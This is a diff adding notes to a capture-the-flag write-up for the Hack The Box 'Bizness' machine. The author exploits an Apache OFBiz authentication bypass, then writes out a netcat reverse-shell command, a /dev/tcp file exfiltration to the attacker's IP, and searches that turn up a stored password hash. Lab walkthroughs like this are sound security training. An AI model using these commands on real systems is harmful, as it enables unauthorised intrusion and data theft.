@@ -78,3 +78,54 @@ Doesn't seem there are any other directories, and all calls redirect to the orig
 This didn't find anything. After looking at the forums a bit I see that this is related to some CVE. When I look at the page I see that Apache OFBiz is used. A quick google search reveals (this)[https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass/tree/master]. 
 
 This seems to work. Now I need to get a reverse shell going.
+
+Looking at (this webpage)[https://medium.com/@cuncis/reverse-shell-cheat-sheet-creating-and-using-reverse-shells-for-penetration-testing-and-security-d25a6923362e] I see a bunch of reverse shells to try.
+
+So I started a netcat listener on 2222 with `nc -lnvp 2222`.
+Then I ran `python3 exploit.py --url https://bizness.htb --cmd "nc -e /bin/sh 10.10.14.147 2222"` and it started a reverse shell.
+
+Then something I ran something I learned on the Codify box to get a prettier output.
+
+Now I have a foothold.
+
+For a pretty shell.
+```
+script /dev/null -qc /bin/bash
+stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
+```
+
+# Foothold
+
+Running `cat /etc/passwd` I don't see any suspicous users.
+
+Running `find -name '*user.txt' 2>/dev/null` finds the user flags
+
+So running `cat /home/ofbiz/user.txt` gets the first flag.
+
+Now how to privesc.
+
+Running `find -name '*.db' 2>/dev/null` shows a bunch of dbs but none of them seem to be what I want.
+
+I found one I wanted to try and read locally.
+
+To do this I start a netcat locally with `nc -lvnp 4444 > listchanges.db`
+
+Then I run `cat /var/lib/apt/listchanges.db > /dev/tcp/10.10.14.147/4444`
+
+I found (this page)[https://stackoverflow.com/questions/37644/examining-berkeley-db-files-from-the-cli] for working Berkley DB.
+
+This was a red herring.
+
+Discussion posts seem to indicate the trick here is the dat files.
+
+I can find all dat files with `find / -name '*.dat' 2>/dev/null`.
+
+There are a ton. So maybe I can use `find / -name '*.dat' 2>/dev/null | xargs grep -i 'Password'` to narrow it down.
+
+It matches a few binary files.
+
+Turns out c54d0.dat contains the current password in Sha form.
+
+`cat /opt/ofbiz/runtime/data/derby/ofbiz/seg0/c54d0.dat`
+
+So what I gather from the password is we have to create our own hashing function match it. I did find a matching function online for this. I could be offbase, but rooting this box did not feel like it fit into the easy category.
